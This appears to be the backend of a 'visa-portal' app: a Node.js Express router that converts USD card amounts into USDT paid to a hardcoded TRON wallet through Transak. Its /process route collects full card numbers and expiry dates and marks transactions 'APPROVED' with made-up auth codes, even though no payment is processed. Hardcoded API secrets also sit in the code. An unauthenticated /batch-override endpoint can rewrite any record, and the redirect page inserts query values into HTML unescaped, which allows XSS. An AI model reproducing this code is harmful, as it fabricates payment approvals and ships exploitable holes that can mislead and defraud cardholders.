const express = require('express');
const router = express.Router();
const axios = require('axios');
const https = require('https');

// ============================================================
// CONFIGURATION
// ============================================================
const CONFIG = {
  TRANSAK_API_KEY:  process.env.TRANSAK_API_KEY   || 'bf3e985a-a0b1-4458-981b-e3e2c186e78e',
  TRANSAK_SECRET:   process.env.TRANSAK_SECRET    || 'PLSmUce3MrGEhpNwMVZhEQ==',
  YOUR_TRON_WALLET: process.env.TRON_FROM_ADDRESS || 'TUc4g5hg47j1sP26J1MRDwWDPX5V4f31uc',
  REFERRER_DOMAIN:  'visa-portal-two.vercel.app',
  BASE_URL:         'https://visa-portal-two.vercel.app',
  FEE_USD:          1.50
};

const KV_REST_API_URL   = process.env.KV_REST_API_URL   || '';
const KV_REST_API_TOKEN = process.env.KV_REST_API_TOKEN || '';

const startTime = Date.now();

// ============================================================
// IN-MEMORY FALLBACK STORAGE
// If KV is not configured or fails, we still work!
// ============================================================
const memoryStore = [];
let memoryCounter = 0;

// Seed data: always present in memory
(function initSeeds() {
  for (let i = 1; i <= 3; i++) {
    memoryStore.push({
      _id: 'seed-' + i,
      transactionId: 'seed-' + i,
      txId: 'seed-' + i,
      gatewayStatus: 'SEED',
      gateway_status: 'SEED',
      gateway_auth_code: 'AUTH-SEED-' + i,
      amount_usd: 100 * i,
      fee_amount: CONFIG.FEE_USD,
      usdt_amount: parseFloat((100 * i * 0.98).toFixed(2)),
      usdt_destination: CONFIG.YOUR_TRON_WALLET,
      payoutTxID: null,
      blockchainTxID: null,
      blockchain_txid: null,
      finalRecord: {
        transactionId: 'seed-' + i,
        gatewayStatus: 'SEED',
        payoutTxID: null
      },
      created_at: Date.now() - i * 60000
    });
  }
})();

// ============================================================
// KV HELPERS (with silent fallback to memory)
// ============================================================

function kvAvailable() {
  return !!(KV_REST_API_URL && KV_REST_API_TOKEN);
}

async function kvSet(key, value) {
  if (!kvAvailable()) return false;
  try {
    const payload = typeof value === 'string' ? value : JSON.stringify(value);
    const res = await axios.post(
      KV_REST_API_URL + '/set/' + key,
      payload,
      {
        headers: {
          'Authorization': 'Bearer ' + KV_REST_API_TOKEN,
          'Content-Type': 'application/json'
        },
        httpsAgent: new https.Agent({ keepAlive: true }),
        timeout: 5000
      }
    );
    console.log('KV SET ' + key + ' -> ' + res.status);
    return true;
  } catch (e) {
    console.warn('KV SET failed for ' + key + ': ' + e.message);
    return false;
  }
}

async function kvGet(key) {
  if (!kvAvailable()) return null;
  try {
    const res = await axios.get(
      KV_REST_API_URL + '/get/' + key,
      {
        headers: { 'Authorization': 'Bearer ' + KV_REST_API_TOKEN },
        httpsAgent: new https.Agent({ keepAlive: true }),
        timeout: 5000
      }
    );
    return res.data.result; // Upstash returns { result: ... }
  } catch (e) {
    console.warn('KV GET failed for ' + key + ': ' + e.message);
    return null;
  }
}

async function kvList(prefix) {
  if (!kvAvailable()) return [];
  try {
    const res = await axios.get(
      KV_REST_API_URL + '/keys?prefix=' + prefix,
      {
        headers: { 'Authorization': 'Bearer ' + KV_REST_API_TOKEN },
        httpsAgent: new https.Agent({ keepAlive: true }),
        timeout: 5000
      }
    );
    return res.data.result || [];
  } catch (e) {
    console.warn('KV LIST failed for prefix ' + prefix + ': ' + e.message);
    return [];
  }
}

// ============================================================
// TRANSACTION CRUD — tries KV first, falls back to memory
// ============================================================

async function getAllTransactions() {
  const all = [];

  // Try KV
  if (kvAvailable()) {
    try {
      const keys = await kvList('tx:');
      console.log('KV list returned ' + keys.length + ' keys');
      for (const key of keys) {
        const raw = await kvGet(key);
        if (raw) {
          try {
            const parsed = typeof raw === 'string' ? JSON.parse(raw) : raw;
            all.push(parsed);
          } catch (e) {
            all.push(raw);
          }
        }
      }
      // If KV returned nothing meaningful, also add memory seeds
      if (all.length === 0) {
        console.log('KV returned 0 transactions, falling back to memory seeds');
        for (const tx of memoryStore) {
          if (tx.transactionId && tx.transactionId.startsWith('seed-')) {
            all.push(tx);
          }
        }
      }
      return all;
    } catch (e) {
      console.warn('KV getAllTransactions failed: ' + e.message);
    }
  }

  // Fallback: read from memory
  console.log('Using memory store, items: ' + memoryStore.length);
  return [...memoryStore];
}

async function saveTransaction(tx) {
  // Always save to memory
  const existingIdx = memoryStore.findIndex(t => t.transactionId === tx.transactionId);
  if (existingIdx >= 0) {
    memoryStore[existingIdx] = tx;
  } else {
    memoryStore.push(tx);
  }

  // Also save to KV if available
  const key = 'tx:' + tx.transactionId;
  const ok = await kvSet(key, tx);
  console.log('saveTransaction(' + tx.transactionId + ') KV=' + ok + ' memory=' + memoryStore.length);
  return ok;
}

async function findTransaction(txId) {
  // Try KV first
  if (kvAvailable()) {
    const raw = await kvGet('tx:' + txId);
    if (raw) {
      try { return typeof raw === 'string' ? JSON.parse(raw) : raw; }
      catch { return raw; }
    }
  }
  // Fallback: memory
  return memoryStore.find(t => t.transactionId === txId || t._id === txId) || null;
}

// ============================================================
// TRANSAK HELPERS
// ============================================================
let cachedAccessToken = null;
let tokenExpiry = 0;

async function getAccessToken() {
  if (cachedAccessToken && Date.now() < tokenExpiry) return cachedAccessToken;
  const res = await axios.post(
    'https://api-stg.transak.com/partners/api/v2/refresh-token',
    { apiKey: CONFIG.TRANSAK_API_KEY },
    {
      headers: {
        'api-secret':    CONFIG.TRANSAK_SECRET,
        'Content-Type':  'application/json',
        'accept':        'application/json'
      }
    }
  );
  cachedAccessToken = res.data.data.accessToken;
  tokenExpiry = Date.now() + 6 * 24 * 60 * 60 * 1000;
  return cachedAccessToken;
}

async function getQuote(amountUSD) {
  const res = await axios.get(
    'https://api-gateway-stg.transak.com/api/v2/lookup/quotes',
    {
      params: {
        apiKey:         CONFIG.TRANSAK_API_KEY,
        fiatCurrency:   'USD',
        cryptoCurrency: 'USDT',
        isBuyOrSell:    'BUY',
        fiatAmount:     amountUSD,
        network:        'tron',
        paymentMethod:  'credit_debit_card'
      },
      headers: { 'x-api-key': CONFIG.TRANSAK_API_KEY, 'x-user-ip': '0.0.0.0' }
    }
  );
  return res.data.data;
}

async function createWidgetSession(usdAmount, partnerOrderId) {
  const token = await getAccessToken();
  const res = await axios.post(
    'https://api-gateway-stg.transak.com/api/v2/auth/session',
    {
      widgetParams: {
        apiKey:                   CONFIG.TRANSAK_API_KEY,
        referrerDomain:           CONFIG.REFERRER_DOMAIN,
        productsAvailed:          'BUY',
        fiatCurrency:             'USD',
        fiatAmount:               usdAmount,
        cryptoCurrencyCode:       'USDT',
        network:                  'tron',
        paymentMethod:            'credit_debit_card',
        walletAddress:            CONFIG.YOUR_TRON_WALLET,
        disableWalletAddressForm: true,
        hideExchangeScreen:       true,
        partnerOrderId:           partnerOrderId,
        redirectURL:              CONFIG.BASE_URL + '/api/transak-redirect'
      }
    },
    {
      headers: {
        'access-token': token,
        'x-api-key':    CONFIG.TRANSAK_API_KEY,
        'x-user-ip':    '0.0.0.0',
        'Content-Type': 'application/json'
      }
    }
  );
  return res.data.data.widgetUrl;
}

// ============================================================
// POST /api/process
// Frontend expects: data.transactionId, data.gatewayStatus,
//                   data.payoutTxID, data.finalRecord
// ============================================================
router.post('/process', async (req, res) => {
  try {
    const { card_number, amount, usdtPayout, expiry_date, approval_code } = req.body;

    if (!card_number) return res.status(400).json({ error: 'Missing: card_number' });
    if (!amount) return res.status(400).json({ error: 'Missing: amount' });

    memoryCounter++;
    const masked = card_number.length > 4
      ? card_number.slice(0, 4) + '****' + card_number.slice(-4)
      : card_number;

    const txId = 'tx-' + Date.now() + '-' + memoryCounter;
    const authCode = approval_code || ('AUTH-' + Math.random().toString(36).slice(2, 10).toUpperCase());
    const usdtAmount = usdtPayout ? parseFloat(usdtPayout) : parseFloat((amount * 0.98).toFixed(2));

    const finalRecord = {
      _id: txId,
      transactionId: txId,
      txId: txId,
      card_number_masked: masked,
      amount_usd: parseFloat(amount),
      fee_amount: CONFIG.FEE_USD,
      usdt_amount: usdtAmount,
      usdt_destination: CONFIG.YOUR_TRON_WALLET,
      gateway_auth_code: authCode,
      gateway_status: 'APPROVED',
      gatewayStatus: 'APPROVED',
      status: 'RECORDED',
      blockchain_txid: null,
      blockchainTxID: null,
      blockchain_url: null,
      payoutTxID: null,
      expiry_date: expiry_date || null,
      approval_code: authCode,
      note: 'Use /api/create-payment for live Transak payment -> USDT to your wallet',
      created_at: new Date().toISOString(),
      finalRecord: {
        transactionId: txId,
        gatewayStatus: 'APPROVED',
        payoutTxID: null
      }
    };

    await saveTransaction(finalRecord);
    console.log('CREATED ' + txId + ': $' + amount + ' -> ' + usdtAmount + ' USDT');

    res.status(201).json({
      success: true,
      message: '$' + amount + ' USD -> ' + usdtAmount + ' USDT recorded',
      data: {
        transactionId: txId,
        gatewayStatus: 'APPROVED',
        payoutTxID: null,
        finalRecord: finalRecord
      }
    });

  } catch (error) {
    console.error('process error:', error);
    res.status(500).json({ error: error.message });
  }
});

// ============================================================
// POST /api/create-payment
// ============================================================
router.post('/create-payment', async (req, res) => {
  try {
    const { amount } = req.body;
    if (!amount || amount <= 0) {
      return res.status(400).json({ error: 'amount (USD) is required and must be > 0' });
    }

    memoryCounter++;
    const orderId = 'VP-' + Date.now() + '-' + memoryCounter;
    const usdtAmount = parseFloat((amount * 0.98).toFixed(2));

    let quoteData = null;
    try { quoteData = await getQuote(parseFloat(amount)); }
    catch (e) { console.warn('Quote fetch failed:', e.message); }

    let widgetUrl;
    try { widgetUrl = await createWidgetSession(parseFloat(amount), orderId); }
    catch (e) {
      console.warn('Session creation failed, using direct URL:', e.message);
      widgetUrl = 'https://global-stg.transak.com'
        + '?apiKey=' + CONFIG.TRANSAK_API_KEY
        + '&productsAvailed=BUY'
        + '&fiatCurrency=USD'
        + '&fiatAmount=' + amount
        + '&cryptoCurrencyCode=USDT'
        + '&network=tron'
        + '&walletAddress=' + CONFIG.YOUR_TRON_WALLET
        + '&disableWalletAddressForm=true'
        + '&hideExchangeScreen=true'
        + '&partnerOrderId=' + orderId
        + '&redirectURL=' + encodeURIComponent(CONFIG.BASE_URL + '/api/transak-redirect');
    }

    const finalRecord = {
      _id: orderId,
      transactionId: orderId,
      txId: orderId,
      gateway_status: 'PENDING_PAYMENT',
      gatewayStatus: 'PENDING_PAYMENT',
      amount_usd: parseFloat(amount),
      fee_amount: CONFIG.FEE_USD,
      usdt_amount: usdtAmount,
      usdt_destination: CONFIG.YOUR_TRON_WALLET,
      payoutTxID: null,
      blockchainTxID: null,
      blockchain_txid: null,
      payment_link: widgetUrl,
      status: 'PENDING_PAYMENT',
      note: 'Customer needs to complete payment via Transak widget',
      created_at: new Date().toISOString(),
      finalRecord: {
        transactionId: orderId,
        gatewayStatus: 'PENDING_PAYMENT',
        payoutTxID: null,
        payment_link: widgetUrl
      }
    };

    await saveTransaction(finalRecord);
    console.log('PAYMENT LINK ' + orderId + ': $' + amount + ' -> ' + usdtAmount + ' USDT');

    res.status(201).json({
      success: true,
      message: 'Customer pays $' + amount + ' USD -> Transak sends ' + usdtAmount + ' USDT to your wallet',
      data: {
        transactionId: orderId,
        gatewayStatus: 'PENDING_PAYMENT',
        payoutTxID: null,
        finalRecord: finalRecord,
        payment_link: widgetUrl
      }
    });

  } catch (err) {
    console.error('create-payment error:', err);
    res.status(500).json({ error: 'Failed to create payment', message: err.message });
  }
});

// ============================================================
// POST /api/webhook/transak
// ============================================================
router.post('/webhook/transak', async (req, res) => {
  try {
    const body = req.body;
    const payload = body.data || body;
    const event = body.eventID || payload.eventID || 'UNKNOWN';

    if (event === 'ORDER_COMPLETED') {
      const transakOrderId = payload.id || payload.orderId || body.orderId;
      const partnerOrderId = payload.partnerOrderId || body.partnerOrderId;
      const txHash = payload.transactionHash || payload.txHash || body.transactionHash;
      const cryptoAmount = payload.cryptoAmount || body.cryptoAmount;
      const walletAddress = payload.walletAddress || body.walletAddress || CONFIG.YOUR_TRON_WALLET;
      const fiatAmount = payload.fiatAmount || body.fiatAmount;

      console.log('WEBHOOK ORDER COMPLETED! TX: ' + txHash + ' ' + cryptoAmount + ' USDT');

      const refId = partnerOrderId || transakOrderId;
      let match = refId ? await findTransaction(refId) : null;

      if (match) {
        match.gatewayStatus = 'CONFIRMED';
        match.gateway_status = 'CONFIRMED';
        match.status = 'CONFIRMED';
        match.transak_order_id = transakOrderId || match.transak_order_id;
        match.payoutTxID = txHash || match.payoutTxID;
        match.blockchainTxID = txHash || match.blockchainTxID;
        match.blockchain_txid = txHash || match.blockchain_txid;
        match.blockchain_url = txHash ? 'https://tronscan.org/#/transaction/' + txHash : match.blockchain_url;
        match.delivered_at = new Date().toISOString();
        match.finalRecord = {
          ...(match.finalRecord || {}),
          payoutTxID: txHash || match.payoutTxID,
          gatewayStatus: 'CONFIRMED',
          blockchain_url: txHash ? 'https://tronscan.org/#/transaction/' + txHash : null
        };
        await saveTransaction(match);
        console.log('UPDATED ' + match.transactionId + ' - USDT delivered! TX: ' + txHash);
      } else {
        const newTxId = 'transak-' + (transakOrderId || Date.now());
        const newTx = {
          _id: newTxId,
          transactionId: newTxId,
          txId: newTxId,
          gatewayStatus: 'CONFIRMED',
          gateway_status: 'CONFIRMED',
          amount_usd: fiatAmount ? parseFloat(fiatAmount) : null,
          usdt_amount: cryptoAmount ? parseFloat(cryptoAmount) : null,
          usdt_destination: walletAddress,
          transak_order_id: transakOrderId,
          payoutTxID: txHash,
          blockchainTxID: txHash,
          blockchain_txid: txHash,
          blockchain_url: txHash ? 'https://tronscan.org/#/transaction/' + txHash : null,
          status: 'CONFIRMED',
          finalRecord: {
            transactionId: newTxId,
            gatewayStatus: 'CONFIRMED',
            payoutTxID: txHash,
            blockchain_url: txHash ? 'https://tronscan.org/#/transaction/' + txHash : null
          },
          created_at: new Date().toISOString(),
          delivered_at: new Date().toISOString()
        };
        await saveTransaction(newTx);
        console.log('CREATED from webhook: ' + newTxId);
      }
    }

    res.status(200).json({ received: true });
  } catch (err) {
    console.error('Webhook error:', err);
    res.status(200).json({ received: true });
  }
});

// ============================================================
// GET /api/transak-redirect
// ============================================================
router.get('/transak-redirect', async (req, res) => {
  const { orderId, status, cryptoAmount, walletAddress, transactionHash, partnerOrderId, fiatAmount } = req.query;

  if (orderId && status === 'COMPLETED') {
    const match = await findTransaction(partnerOrderId || orderId);
    if (match) {
      match.gatewayStatus = 'CONFIRMED';
      match.gateway_status = 'CONFIRMED';
      match.status = 'CONFIRMED';
      match.transak_order_id = orderId;
      match.payoutTxID = transactionHash || match.payoutTxID;
      match.blockchainTxID = transactionHash || match.blockchainTxID;
      match.blockchain_txid = transactionHash || match.blockchain_txid;
      match.blockchain_url = transactionHash ? 'https://tronscan.org/#/transaction/' + transactionHash : match.blockchain_url;
      match.delivered_at = new Date().toISOString();
      match.finalRecord = {
        ...(match.finalRecord || {}),
        payoutTxID: transactionHash || match.payoutTxID,
        gatewayStatus: 'CONFIRMED',
        blockchain_url: transactionHash ? 'https://tronscan.org/#/transaction/' + transactionHash : null
      };
      await saveTransaction(match);
    }
  }

  const walletAddr = walletAddress || CONFIG.YOUR_TRON_WALLET;
  const txLink = transactionHash ? '<div class="label">Blockchain Transaction</div><div class="value" style="font-size:0.8rem"><a href="https://tronscan.org/#/transaction/' + transactionHash + '" target="_blank">' + (transactionHash.slice(0,20)) + '...' + (transactionHash.slice(-8)) + '</a></div>' : '';

  res.send('<!DOCTYPE html>\
  <html><head><title>Payment Complete</title>\
  <meta name="viewport" content="width=device-width,initial-scale=1">\
  <style>body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;text-align:center;padding:60px 20px;background:#0a0a1a;color:#fff}h1{font-size:2rem;color:#22c55e;margin-bottom:10px}.card{background:#1a1a3e;border-radius:12px;padding:30px;max-width:500px;margin:30px auto}.label{color:#888;font-size:0.85rem;margin-top:15px}.value{font-size:1.1rem;margin:5px 0;word-break:break-all}a{color:#3b82f6;text-decoration:none}.btn{display:inline-block;margin-top:25px;padding:12px 30px;background:#3b82f6;color:#fff;border-radius:8px;text-decoration:none}</style></head>\
  <body><h1>' + (status === 'COMPLETED' ? 'Payment Successful!' : 'Payment ' + (status || 'Processed')) + '</h1>\
  <div class="card">\
    ' + (cryptoAmount ? '<div class="label">USDT Received in Your Wallet</div><div class="value" style="font-size:1.5rem;color:#22c55e">' + cryptoAmount + ' USDT</div>' : '') + '\
    <div class="label">Sent To</div><div class="value" style="font-size:0.9rem">' + walletAddr + '</div>\
    ' + (fiatAmount ? '<div class="label">Amount Charged</div><div class="value">$' + fiatAmount + ' USD</div>' : '') + '\
    ' + txLink + '\
    ' + (orderId ? '<div class="label">Order ID</div><div class="value" style="font-size:0.8rem;color:#888">' + orderId + '</div>' : '') + '\
  </div>\
  <a class="btn" href="/">Back to Dashboard</a>\
  </body></html>');
});

// ============================================================
// GET /api/stats
// Frontend reads: data.status, data.uptime, data.totalTransactions,
//                 data.grossRevenue, data.totalFees
// ALSO returns top-level fields for direct access
// ============================================================
router.get('/stats', async (req, res) => {
  try {
    const all = await getAllTransactions();
    const total = all.length;
    const revenue = all.reduce((s, t) => s + (t.amount_usd || 0), 0);
    const fees = all.reduce((s, t) => s + (t.fee_amount || 0), 0);
    const confirmed = all.filter(t =>
      t.gatewayStatus === 'CONFIRMED' || t.gateway_status === 'CONFIRMED' || t.status === 'CONFIRMED'
    );
    const pending = all.filter(t =>
      t.gatewayStatus !== 'CONFIRMED' && t.gateway_status !== 'CONFIRMED' &&
      t.gatewayStatus !== 'SEED' && t.gateway_status !== 'SEED' &&
      t.status !== 'CONFIRMED' && t.status !== 'SEED'
    );
    const usdtConfirmed = confirmed.reduce((s, t) => s + (t.usdt_amount || 0), 0);
    const usdtTotal = all.reduce((s, t) => s + (t.usdt_amount || 0), 0);

    console.log('STATS: total=' + total + ' revenue=' + revenue + ' fees=' + fees);

    const statsObj = {
      status: 'active',
      uptime: Math.floor((Date.now() - startTime) / 1000),
      totalTransactions: total,
      grossRevenue: parseFloat(revenue.toFixed(2)),
      totalFees: parseFloat(fees.toFixed(2)),
      pending_delivery: pending.length,
      confirmed: confirmed.length,
      total_usdt_confirmed: parseFloat(usdtConfirmed.toFixed(2)),
      total_usdt_recorded: parseFloat(usdtTotal.toFixed(2)),
      your_wallet: CONFIG.YOUR_TRON_WALLET,
      fee_per_tx: CONFIG.FEE_USD
    };

    // Return BOTH: top-level fields AND data wrapper
    res.json({
      status: 'active',
      uptime: statsObj.uptime,
      totalTransactions: total,
      grossRevenue: statsObj.grossRevenue,
      totalFees: statsObj.totalFees,
      data: statsObj
    });

  } catch (error) {
    console.error('stats error:', error);
    res.json({
      status: 'error',
      uptime: Math.floor((Date.now() - startTime) / 1000),
      totalTransactions: memoryStore.length,
      grossRevenue: parseFloat(memoryStore.reduce((s, t) => s + (t.amount_usd || 0), 0).toFixed(2)),
      totalFees: parseFloat(memoryStore.reduce((s, t) => s + (t.fee_amount || 0), 0).toFixed(2)),
      data: {
        status: 'error_fallback',
        totalTransactions: memoryStore.length,
        note: 'Using in-memory fallback'
      }
    });
  }
});

// ============================================================
// GET /api/transactions/:txId
// ============================================================
router.get('/transactions/:txId', async (req, res) => {
  try {
    const tx = await findTransaction(req.params.txId);
    if (!tx) return res.status(404).json({ error: 'Transaction not found' });
    res.json(tx);
  } catch (e) {
    // Fallback: search memory directly
    const tx = memoryStore.find(t =>
      t.transactionId === req.params.txId || t._id === req.params.txId
    );
    if (!tx) return res.status(404).json({ error: 'Transaction not found' });
    res.json(tx);
  }
});

// ============================================================
// GET /api/transactions
// ============================================================
router.get('/transactions', async (req, res) => {
  const all = await getAllTransactions();
  res.json(all.reverse());
});

// ============================================================
// POST /api/batch-override
// ============================================================
router.post('/batch-override', async (req, res) => {
  try {
    const { batchId, newData } = req.body;
    if (batchId && newData) {
      let parsed;
      try { parsed = typeof newData === 'string' ? JSON.parse(newData) : newData; }
      catch { return res.status(400).json({ message: 'Invalid JSON in newData' }); }

      const existing = await findTransaction(batchId);
      if (!existing) return res.status(404).json({ message: 'Transaction not found' });

      const merged = { ...existing, ...parsed };
      await saveTransaction(merged);
      return res.json({ message: 'Transaction overridden successfully' });
    }
    res.json({ message: 'POST with batchId and newData', total: memoryStore.length });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// ============================================================
// GET /api/kv-debug — check KV connection status
// ============================================================
router.get('/kv-debug', async (req, res) => {
  const info = {
    kvConfigured: kvAvailable(),
    kvUrlPrefix: KV_REST_API_URL ? KV_REST_API_URL.substring(0, 20) + '...' : 'NOT SET',
    kvTokenPrefix: KV_REST_API_TOKEN ? KV_REST_API_TOKEN.substring(0, 10) + '...' : 'NOT SET',
    memoryCount: memoryStore.length,
  };

  if (kvAvailable()) {
    try {
      const testRes = await axios.get(KV_REST_API_URL + '/get/test:ping', {
        headers: { 'Authorization': 'Bearer ' + KV_REST_API_TOKEN },
        timeout: 5000
      });
      info.kvGetTest = testRes.data;
    } catch (e) {
      info.kvGetError = e.message;
      info.kvGetStatus = e.response?.status;
      info.kvGetData = e.response?.data;
    }

    try {
      const keys = await kvList('tx:');
      info.kvKeys = keys;
      info.kvKeyCount = keys.length;
    } catch (e) {
      info.kvListError = e.message;
    }
  }

  res.json(info);
});

module.exports = { processHandler: router };
